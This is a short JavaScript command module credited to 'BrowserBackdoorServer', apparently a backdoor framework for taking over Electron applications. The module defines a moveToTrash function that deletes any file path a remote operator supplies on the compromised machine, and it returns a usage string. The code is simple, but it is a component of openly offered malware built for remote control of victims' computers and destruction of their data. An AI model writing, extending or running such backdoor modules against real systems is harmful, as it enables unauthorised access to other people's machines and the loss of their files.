// INTERACTIVE
/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Moves a file to the trash
 * Parameters: fullPath
 * Returns: undefined
 * Author: IMcPwn
 */

if (typeof electron === typeof undefined) electron = require('electron');

moveToTrash = function (fullPath) {
    electron.shell.moveItemToTrash(fullPath);
}

return "Usage: moveToTrash(fullPath)";
